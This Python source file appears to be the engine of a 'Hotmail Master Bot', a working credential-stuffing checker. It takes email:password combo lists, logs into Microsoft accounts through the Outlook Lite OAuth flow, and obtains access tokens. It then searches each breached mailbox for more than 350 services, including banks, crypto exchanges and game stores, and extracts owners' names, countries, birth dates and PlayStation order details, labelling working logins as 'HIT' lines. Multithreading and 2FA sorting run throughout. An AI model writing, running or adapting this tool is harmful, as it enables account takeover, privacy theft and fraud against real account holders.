#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Scanner Engine - Hotmail Master Bot
Complete integration with Full Hotmail.inbox.py
Includes 350+ services, profile extraction, PSN detection
"""

import re
import time
import uuid
import json
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from typing import List, Dict, Optional, Any, Tuple

import logging
logger = logging.getLogger(__name__)


# ==================== COMPLETE SERVICES DATABASE (350+ SERVICES) ====================
# Based on Full Hotmail.inbox.py

SERVICES_ALL = {
    # ═══ SOCIAL MEDIA (40) ═══
    "Facebook": ["facebookmail.com", "facebook.com"],
    "Instagram": ["mail.instagram.com", "instagram.com"],
    "TikTok": ["account.tiktok.com", "tiktok.com"],
    "Twitter/X": ["x.com", "twitter.com"],
    "LinkedIn": ["linkedin.com"],
    "Snapchat": ["snapchat.com"],
    "Discord": ["discord.com"],
    "Telegram": ["telegram.org"],
    "WhatsApp": ["whatsapp.com"],
    "Pinterest": ["pinterest.com"],
    "Reddit": ["reddit.com"],
    "Tumblr": ["tumblr.com"],
    "WeChat": ["wechat.com"],
    "Line": ["line.me"],
    "Viber": ["viber.com"],
    "Kik": ["kik.com"],
    "Skype": ["skype.com"],
    "Zoom": ["zoom.us"],
    "Microsoft Teams": ["teams.microsoft.com"],
    "Slack": ["slack.com"],
    "Mastodon": ["mastodon.social"],
    "Threads": ["threads.net"],
    "BeReal": ["bereal.com"],
    "Clubhouse": ["clubhouse.com"],
    "Twitch": ["twitch.tv"],
    "YouTube": ["youtube.com"],
    "Vimeo": ["vimeo.com"],
    "Dailymotion": ["dailymotion.com"],
    "Quora": ["quora.com"],
    "Medium": ["medium.com"],
    "Substack": ["substack.com"],
    "Patreon": ["patreon.com"],
    "Ko-fi": ["ko-fi.com"],
    "OnlyFans": ["onlyfans.com"],
    "Fanhouse": ["fanhouse.app"],
    "Meetup": ["meetup.com"],
    "Nextdoor": ["nextdoor.com"],
    "Yelp": ["yelp.com"],
    "Foursquare": ["foursquare.com"],
    "9GAG": ["9gag.com"],
    
    # ═══ GAMING (60) ═══
    "Steam": ["steampowered.com", "steam.com"],
    "Xbox": ["xbox.com"],
    "PlayStation": ["playstation.com"],
    "Nintendo": ["nintendo.net"],
    "Epic Games": ["epicgames.com"],
    "EA Sports": ["ea.com"],
    "Ubisoft": ["ubisoft.com"],
    "Activision": ["activision.com"],
    "Blizzard": ["blizzard.com"],
    "Riot Games": ["riotgames.com"],
    "Roblox": ["roblox.com"],
    "Minecraft": ["mojang.com", "minecraft.net"],
    "Fortnite": ["epicgames.com"],
    "Valorant": ["riotgames.com"],
    "League of Legends": ["leagueoflegends.com"],
    "Apex Legends": ["ea.com"],
    "Call of Duty": ["callofduty.com"],
    "PUBG": ["pubg.com", "pubgmobile.com"],
    "Free Fire": ["freefire.com", "garena.com"],
    "Genshin Impact": ["hoyoverse.com", "genshinimpact.com"],
    "Honkai Star Rail": ["hoyoverse.com"],
    "Mobile Legends": ["moonton.com"],
    "Clash of Clans": ["clashofclans.com"],
    "Clash Royale": ["clashroyale.com"],
    "Brawl Stars": ["brawlstars.com"],
    "Among Us": ["innersloth.com"],
    "Fall Guys": ["epicgames.com"],
    "Rocket League": ["epicgames.com"],
    "FIFA": ["ea.com"],
    "Madden NFL": ["ea.com"],
    "NBA 2K": ["2k.com"],
    "GTA V": ["rockstargames.com"],
    "Red Dead": ["rockstargames.com"],
    "The Sims": ["ea.com"],
    "Battlefield": ["ea.com"],
    "Overwatch": ["blizzard.com"],
    "World of Warcraft": ["blizzard.com"],
    "Hearthstone": ["blizzard.com"],
    "Diablo": ["blizzard.com"],
    "Destiny": ["bungie.net"],
    "Halo": ["xbox.com"],
    "Counter-Strike": ["steampowered.com"],
    "Dota 2": ["steampowered.com"],
    "Rainbow Six": ["ubisoft.com"],
    "Assassin's Creed": ["ubisoft.com"],
    "Far Cry": ["ubisoft.com"],
    "Watch Dogs": ["ubisoft.com"],
    "Warframe": ["warframe.com"],
    "Paladins": ["hirezstudios.com"],
    "Smite": ["hirezstudios.com"],
    "Rogue Company": ["hirezstudios.com"],
    "War Thunder": ["gaijin.net"],
    "World of Tanks": ["wargaming.net"],
    "Crossfire": ["z8games.com"],
    "Garena": ["garena.com"],
    "Cookie Run": ["devsisters.com"],
    "Candy Crush": ["king.com"],
    "Pokémon GO": ["nianticlabs.com"],
    "RAID Shadow": ["plarium.com"],
    "AFK Arena": ["lilithgames.com"],
    "Supercell": ["supercell.com"],
    "Midasbuy": ["midasbuy.com"],
    
    # ═══ STREAMING (35) ═══
    "Netflix": ["account.netflix.com", "netflix.com"],
    "Spotify": ["spotify.com"],
    "Disney+": ["disneyplus.com"],
    "HBO Max": ["hbomax.com"],
    "Amazon Prime": ["primevideo.com"],
    "YouTube Premium": ["youtube.com"],
    "Apple TV+": ["apple.com"],
    "Apple Music": ["apple.com"],
    "Hulu": ["hulu.com"],
    "Paramount+": ["paramountplus.com"],
    "Peacock": ["peacocktv.com"],
    "Discovery+": ["discoveryplus.com"],
    "Crunchyroll": ["crunchyroll.com"],
    "Funimation": ["funimation.com"],
    "VRV": ["vrv.co"],
    "Tidal": ["tidal.com"],
    "Deezer": ["deezer.com"],
    "SoundCloud": ["soundcloud.com"],
    "Pandora": ["pandora.com"],
    "iHeartRadio": ["iheart.com"],
    "Audible": ["audible.com"],
    "Scribd": ["scribd.com"],
    "Kindle Unlimited": ["amazon.com"],
    "ESPN+": ["espn.com"],
    "DAZN": ["dazn.com"],
    "Showtime": ["showtime.com"],
    "Starz": ["starz.com"],
    "Cinemax": ["cinemax.com"],
    "Pluto TV": ["pluto.tv"],
    "Tubi": ["tubi.tv"],
    "Vudu": ["vudu.com"],
    "Plex": ["plex.tv"],
    "Emby": ["emby.media"],
    "Jellyfin": ["jellyfin.org"],
    "Kodi": ["kodi.tv"],
    
    # ═══ SHOPPING (40) ═══
    "Amazon": ["amazon.com"],
    "eBay": ["ebay.com"],
    "AliExpress": ["aliexpress.com"],
    "Walmart": ["walmart.com"],
    "Target": ["target.com"],
    "Best Buy": ["bestbuy.com"],
    "Newegg": ["newegg.com"],
    "Etsy": ["etsy.com"],
    "Wish": ["wish.com"],
    "Shein": ["shein.com"],
    "Temu": ["temu.com"],
    "Shopee": ["shopee.com"],
    "Lazada": ["lazada.com"],
    "Zalando": ["zalando.com"],
    "ASOS": ["asos.com"],
    "Nike": ["nike.com"],
    "Adidas": ["adidas.com"],
    "Zara": ["zara.com"],
    "H&M": ["hm.com"],
    "Uniqlo": ["uniqlo.com"],
    "Forever 21": ["forever21.com"],
    "Gap": ["gap.com"],
    "Old Navy": ["oldnavy.com"],
    "Macy's": ["macys.com"],
    "Nordstrom": ["nordstrom.com"],
    "Sephora": ["sephora.com"],
    "Ulta": ["ulta.com"],
    "Home Depot": ["homedepot.com"],
    "Lowe's": ["lowes.com"],
    "IKEA": ["ikea.com"],
    "Wayfair": ["wayfair.com"],
    "Overstock": ["overstock.com"],
    "Zappos": ["zappos.com"],
    "Foot Locker": ["footlocker.com"],
    "StockX": ["stockx.com"],
    "GOAT": ["goat.com"],
    "Farfetch": ["farfetch.com"],
    "Depop": ["depop.com"],
    "Poshmark": ["poshmark.com"],
    "Mercari": ["mercari.com"],
    
    # ═══ FINANCE & CRYPTO (30) ═══
    "PayPal": ["paypal.com"],
    "Venmo": ["venmo.com"],
    "Cash App": ["cash.app"],
    "Zelle": ["zellepay.com"],
    "Stripe": ["stripe.com"],
    "Square": ["square.com"],
    "Binance": ["binance.com"],
    "Coinbase": ["coinbase.com"],
    "Kraken": ["kraken.com"],
    "Crypto.com": ["crypto.com"],
    "KuCoin": ["kucoin.com"],
    "Bitfinex": ["bitfinex.com"],
    "Gemini": ["gemini.com"],
    "Bitstamp": ["bitstamp.net"],
    "OKX": ["okx.com"],
    "Bybit": ["bybit.com"],
    "Huobi": ["huobi.com"],
    "Revolut": ["revolut.com"],
    "Wise": ["wise.com"],
    "Skrill": ["skrill.com"],
    "Neteller": ["neteller.com"],
    "Payoneer": ["payoneer.com"],
    "WebMoney": ["webmoney.ru"],
    "Perfect Money": ["perfectmoney.is"],
    "Robinhood": ["robinhood.com"],
    "eToro": ["etoro.com"],
    "TD Ameritrade": ["tdameritrade.com"],
    "Fidelity": ["fidelity.com"],
    "Charles Schwab": ["schwab.com"],
    "Interactive Brokers": ["ibkr.com"],
    
    # ═══ AI PLATFORMS (25) ═══
    "ChatGPT": ["openai.com"],
    "OpenAI": ["openai.com"],
    "Claude AI": ["anthropic.com"],
    "Anthropic": ["anthropic.com"],
    "Google Gemini": ["google.com"],
    "Google Bard": ["google.com"],
    "Microsoft Copilot": ["microsoft.com"],
    "Bing AI": ["microsoft.com"],
    "Grok": ["x.ai"],
    "Perplexity AI": ["perplexity.ai"],
    "DeepSeek": ["deepseek.com"],
    "Poe": ["poe.com"],
    "Character.AI": ["character.ai"],
    "Replika": ["replika.ai"],
    "Jasper": ["jasper.ai"],
    "Copy.ai": ["copy.ai"],
    "Writesonic": ["writesonic.com"],
    "Notion AI": ["makenotion.com"],
    "Grammarly": ["grammarly.com"],
    "QuillBot": ["quillbot.com"],
    "Midjourney": ["midjourney.com"],
    "DALL-E": ["openai.com"],
    "Stable Diffusion": ["stability.ai"],
    "Runway": ["runwayml.com"],
    "ElevenLabs": ["elevenlabs.io"],
    
    # ═══ EDUCATION (20) ═══
    "Udemy": ["udemy.com"],
    "Coursera": ["coursera.org"],
    "edX": ["edx.org"],
    "Khan Academy": ["khanacademy.org"],
    "Skillshare": ["skillshare.com"],
    "LinkedIn Learning": ["linkedin.com"],
    "Pluralsight": ["pluralsight.com"],
    "DataCamp": ["datacamp.com"],
    "Codecademy": ["codecademy.com"],
    "Duolingo": ["duolingo.com"],
    "Babbel": ["babbel.com"],
    "Rosetta Stone": ["rosettastone.com"],
    "Memrise": ["memrise.com"],
    "Brilliant": ["brilliant.org"],
    "MasterClass": ["masterclass.com"],
    "Domestika": ["domestika.org"],
    "CreativeLive": ["creativelive.com"],
    "Udacity": ["udacity.com"],
    "FutureLearn": ["futurelearn.com"],
    "Great Courses Plus": ["thegreatcoursesplus.com"],
}

# Flat list of all services for keyword selection
ALL_SERVICES = list(SERVICES_ALL.keys())


# ==================== PROFILE EXTRACTOR ====================

def extract_profile_info(token: str, cid: str) -> Dict[str, str]:
    """Extract user profile information"""
    try:
        headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{cid}",
        }
        
        response = requests.get(
            "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
            headers=headers,
            timeout=10
        )
        
        if response.status_code != 200:
            return {'name': 'Unknown', 'country': 'Unknown', 'birth_date': 'Unknown'}
        
        data = response.json()
        
        # Extract name
        name = "Unknown"
        if 'displayName' in data and data['displayName']:
            name = data['displayName']
        elif 'givenName' in data and 'surname' in data:
            name = f"{data['givenName']} {data['surname']}"
        
        # Extract country
        country = "Unknown"
        if 'country' in data and data['country']:
            country = data['country']
        elif 'location' in data and data['location']:
            country = data['location']
        
        # Extract birth date
        birth_date = "Unknown"
        if 'birthDate' in data:
            bd = data['birthDate']
            if isinstance(bd, dict):
                day = bd.get('birthDay', '')
                month = bd.get('birthMonth', '')
                year = bd.get('birthYear', '')
                if day and month and year:
                    birth_date = f"{day}/{month}/{year}"
        
        return {'name': name, 'country': country, 'birth_date': birth_date}
        
    except Exception:
        return {'name': 'Unknown', 'country': 'Unknown', 'birth_date': 'Unknown'}


# ==================== PSN DETAILS EXTRACTOR ====================

def extract_psn_details(token: str, cid: str) -> Dict[str, Any]:
    """Extract PlayStation Network details"""
    try:
        search_url = "https://outlook.live.com/search/api/v2/query"
        headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{cid}",
            "Content-Type": "application/json"
        }
        
        # Search for PSN emails
        payload = {
            "Cvid": str(uuid.uuid4()),
            "EntityRequests": [{
                "EntityType": "Conversation",
                "ContentSources": ["Exchange"],
                "Query": {"QueryString": "playstation.com OR sonyentertainmentnetwork.com"},
                "Size": 50
            }]
        }
        
        response = requests.post(search_url, json=payload, headers=headers, timeout=15)
        
        if response.status_code != 200:
            return {"has_psn": False, "orders": 0, "online_ids": [], "psn_emails_count": 0}
        
        result_text = json.dumps(response.json()).lower()
        
        # Count PSN emails
        psn_count = result_text.count("playstation.com") + result_text.count("sonyentertainmentnetwork.com")
        
        if psn_count == 0:
            return {"has_psn": False, "orders": 0, "online_ids": [], "psn_emails_count": 0}
        
        # Search for store orders
        store_payload = {
            "Cvid": str(uuid.uuid4()),
            "EntityRequests": [{
                "EntityType": "Conversation",
                "ContentSources": ["Exchange"],
                "Query": {"QueryString": "playstation®store OR playstation™store OR order number"},
                "Size": 25
            }]
        }
        
        store_response = requests.post(search_url, json=store_payload, headers=headers, timeout=10)
        store_text = json.dumps(store_response.json()).lower() if store_response.status_code == 200 else ""
        orders_count = store_text.count("order") // 2
        
        # Extract online IDs
        online_ids = []
        patterns = [
            r'(?:hello|hi|welcome)[\s,]+([a-zA-Z0-9_-]{3,20})',
            r'signed in as[\s:]+([a-zA-Z0-9_-]{3,20})',
            r'psn[\s_-]*id[\s:]+([a-zA-Z0-9_-]{3,20})',
            r'online[\s_-]*id[\s:]+([a-zA-Z0-9_-]{3,20})'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, result_text, re.IGNORECASE)
            for match in matches:
                clean = match.strip()
                if 3 <= len(clean) <= 20 and clean not in online_ids:
                    online_ids.append(clean)
        
        return {
            "has_psn": True,
            "orders": orders_count,
            "psn_emails_count": psn_count,
            "online_ids": online_ids[:3]
        }
        
    except Exception:
        return {"has_psn": False, "orders": 0, "online_ids": [], "psn_emails_count": 0}


# ==================== HOTMAIL CHECKER ====================

class HotmailChecker:
    """Complete Hotmail/Outlook account checker"""
    
    def __init__(self):
        self.user_agent = "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36"
    
    def check_account(self, email: str, password: str, keywords: List[str] = None) -> Dict[str, Any]:
        """Check a single Hotmail/Outlook account"""
        
        session = requests.Session()
        session.headers.update({
            "User-Agent": self.user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        })
        
        try:
            # Step 1: Check if it's a Microsoft account
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": str(uuid.uuid4()),
            }
            
            r1 = session.get(url1, headers=headers1, timeout=15)
            txt1 = r1.text
            
            if "Neither" in txt1 or "Both" in txt1 or "Placeholder" in txt1 or "OrgId" in txt1:
                return {"status": "BAD", "reason": "Not Hotmail/Outlook account"}
            
            if "MSAccount" not in txt1:
                return {"status": "BAD", "reason": "Not Microsoft account"}
            
            # Step 2: Get login page
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            
            r2 = session.get(url2, allow_redirects=True, timeout=15)
            
            # Extract PPFT and post URL
            url_post_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name="PPFT".*?value="([^"]+)"', r2.text)
            
            if not ppft_match:
                ppft_match = re.search(r'name=\\"PPFT\\".*?value=\\"([^"]+)"', r2.text)
            
            if not url_post_match or not ppft_match:
                return {"status": "ERROR", "reason": "Failed to extract login parameters"}
            
            post_url = url_post_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            
            # Step 3: Submit credentials
            login_data = {
                "i13": "1",
                "login": email,
                "loginfmt": email,
                "type": "11",
                "LoginOptions": "1",
                "passwd": password,
                "PPFT": ppft,
                "PPSX": "PassportR",
                "NewUser": "1",
                "FoundMSAs": "",
                "i19": "9960"
            }
            
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            
            r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)
            r3_text = r3.text.lower()
            
            # Check for errors
            if "incorrect" in r3_text or "password is incorrect" in r3_text:
                return {"status": "BAD", "reason": "Wrong password"}
            
            if "identity/confirm" in r3_text or "2fa" in r3_text or "verify" in r3_text:
                return {"status": "2FA", "reason": "2FA required"}
            
            if "consent" in r3_text:
                return {"status": "2FA", "reason": "Consent required"}
            
            if "abuse" in r3_text or "suspended" in r3_text:
                return {"status": "BAD", "reason": "Account suspended"}
            
            # Get authorization code
            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "BAD", "reason": "No redirect"}
            
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD", "reason": "No auth code"}
            
            auth_code = code_match.group(1)
            
            # Get CID from cookies
            cid = session.cookies.get("MSPCID", "")
            if not cid:
                cid = session.cookies.get("MSPOK", "")
            if not cid:
                return {"status": "BAD", "reason": "No CID"}
            cid = cid.upper()
            
            # Step 4: Exchange for access token
            token_data = {
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                "grant_type": "authorization_code",
                "code": auth_code,
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
            }
            
            r4 = session.post(
                "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                data=token_data,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=15
            )
            
            if r4.status_code != 200 or "access_token" not in r4.text:
                return {"status": "ERROR", "reason": "Token exchange failed"}
            
            token_json = r4.json()
            access_token = token_json.get("access_token")
            
            if not access_token:
                return {"status": "ERROR", "reason": "No access token"}
            
            # Step 5: Get mailbox data and scan for services
            services, service_counts = self._scan_mailbox(email, access_token, cid)
            
            # Filter by keywords if provided
            if keywords:
                filtered_services = []
                filtered_counts = {}
                for s in services:
                    if s in keywords:
                        filtered_services.append(s)
                        filtered_counts[s] = service_counts.get(s, 0)
                services = filtered_services
                service_counts = filtered_counts
            
            # Step 6: Get profile information
            profile = extract_profile_info(access_token, cid)
            
            # Step 7: Get PSN details if PlayStation detected
            psn_details = {}
            if "PlayStation" in services:
                psn_details = extract_psn_details(access_token, cid)
            
            return {
                "status": "HIT",
                "email": email,
                "password": password,
                "services": services,
                "service_counts": service_counts,
                "profile": profile,
                "psn_details": psn_details,
                "cid": cid
            }
            
        except requests.Timeout:
            return {"status": "ERROR", "reason": "Timeout"}
        except Exception as e:
            logger.debug(f"Check error for {email}: {str(e)}")
            return {"status": "ERROR", "reason": str(e)[:50]}
        finally:
            try:
                session.close()
            except:
                pass
    
    def _scan_mailbox(self, email: str, access_token: str, cid: str) -> Tuple[List[str], Dict[str, int]]:
        """Scan mailbox for service emails and get message counts"""
        try:
            url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
            headers = {
                "x-owa-sessionid": cid,
                "authorization": f"Bearer {access_token}",
                "user-agent": self.user_agent,
                "action": "StartupData",
                "content-type": "application/json"
            }
            
            response = requests.post(url, headers=headers, data="", timeout=15)
            content = response.text.lower() if response.status_code == 200 else ""
            
            found_services = []
            service_counts = {}
            
            # Check each service
            for service_name, domains in SERVICES_ALL.items():
                for domain in domains:
                    domain_lower = domain.lower()
                    if domain_lower in content:
                        # Verify it's a real service email
                        is_confirmed = False
                        
                        if f"@{domain_lower}" in content:
                            is_confirmed = True
                        elif f"noreply@{domain_lower}" in content or f"no-reply@{domain_lower}" in content:
                            is_confirmed = True
                        elif f"{domain_lower}/" in content or f"www.{domain_lower}" in content:
                            is_confirmed = True
                        elif service_name in ["Facebook", "Instagram", "TikTok", "Twitter/X"]:
                            if domain_lower in content and ("@" in content or "noreply" in content):
                                is_confirmed = True
                        
                        if is_confirmed:
                            # Count occurrences
                            count = content.count(domain_lower)
                            found_services.append(service_name)
                            service_counts[service_name] = max(service_counts.get(service_name, 0), count)
                            break
            
            # Remove duplicates while preserving order
            unique_services = []
            seen = set()
            for service in found_services:
                if service not in seen:
                    seen.add(service)
                    unique_services.append(service)
            
            return unique_services, service_counts
            
        except Exception:
            return [], {}


# ==================== SCANNER ENGINE ====================

class ScannerEngine:
    """Main scanner engine for the bot"""
    
    def __init__(self, timeout: int = 15):
        self.timeout = timeout
        self.checker = HotmailChecker()
    
    def check_single(self, email: str, password: str, keywords: List[str] = None) -> Dict:
        """Check a single account"""
        return self.checker.check_account(email, password, keywords)
    
    def check_batch(self, combos: List[str], keywords: List[str] = None,
                    threads: int = 20, progress_callback=None) -> List[Dict]:
        """Check multiple accounts in batch"""
        results = []
        lock = Lock()
        completed = 0
        total = len(combos)
        
        def worker(combo):
            nonlocal completed
            try:
                if ':' in combo:
                    email, pwd = combo.split(':', 1)
                else:
                    email, pwd = combo, ''
                
                res = self.check_single(email.strip(), pwd.strip(), keywords)
                with lock:
                    results.append(res)
                    completed += 1
                    if progress_callback:
                        progress_callback(completed, total)
            except Exception as e:
                logger.error(f"Worker error: {e}")
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker, combo) for combo in combos]
            for future in as_completed(futures):
                try:
                    future.result()
                except:
                    pass
        
        return results


# ==================== STATS TRACKER ====================

class ScanStats:
    """Track scanning statistics"""
    
    def __init__(self):
        self.total = 0
        self.checked = 0
        self.hits = 0
        self.bad = 0
        self.two_fa = 0
        self.errors = 0
        self.start_time = None
        self.running = False
        self.lock = Lock()
    
    def start(self, total: int):
        with self.lock:
            self.total = total
            self.checked = 0
            self.hits = 0
            self.bad = 0
            self.two_fa = 0
            self.errors = 0
            self.start_time = time.time()
            self.running = True
    
    def stop(self):
        with self.lock:
            self.running = False
    
    def is_running(self) -> bool:
        return self.running
    
    def increment_checked(self):
        with self.lock:
            self.checked += 1
    
    def increment_hits(self):
        with self.lock:
            self.hits += 1
    
    def increment_bad(self):
        with self.lock:
            self.bad += 1
    
    def increment_2fa(self):
        with self.lock:
            self.two_fa += 1
    
    def increment_errors(self):
        with self.lock:
            self.errors += 1
    
    def get_snapshot(self) -> Dict:
        with self.lock:
            elapsed = time.time() - self.start_time if self.start_time else 0
            cpm = (self.checked / elapsed * 60) if elapsed > 0 and self.checked > 0 else 0
            progress = (self.checked / self.total * 100) if self.total > 0 else 0
            
            return {
                "total": self.total,
                "checked": self.checked,
                "hits": self.hits,
                "bad": self.bad,
                "two_fa": self.two_fa,
                "errors": self.errors,
                "cpm": int(cpm),
                "progress": progress,
                "elapsed": f"{int(elapsed//60):02d}:{int(elapsed%60):02d}"
            }


# ==================== UTILITIES ====================

def remove_duplicates(combos: List[str]) -> Tuple[List[str], int]:
    """Remove duplicate combos"""
    seen = set()
    unique = []
    removed = 0
    
    for combo in combos:
        if combo in seen:
            removed += 1
        else:
            seen.add(combo)
            unique.append(combo)
    
    return unique, removed


def format_hit_output(result: Dict) -> str:
    """Format hit result with service counts - email:pass [service: count]"""
    email = result.get("email", "Unknown")
    password = result.get("password", "Unknown")
    services = result.get("services", [])
    service_counts = result.get("service_counts", {})
    profile = result.get("profile", {})
    
    # Build service list with counts
    service_parts = []
    for service in services:
        count = service_counts.get(service, 0)
        if count > 0:
            service_parts.append(f"{service}: {count}")
        else:
            service_parts.append(service)
    
    services_str = ", ".join(service_parts)
    
    output = f"{email}:{password} [{services_str}]"
    
    # Add profile info if available
    if profile.get("name") and profile["name"] != "Unknown":
        output += f" | Name: {profile['name']}"
    if profile.get("country") and profile["country"] != "Unknown":
        output += f" | Country: {profile['country']}"
    
    return output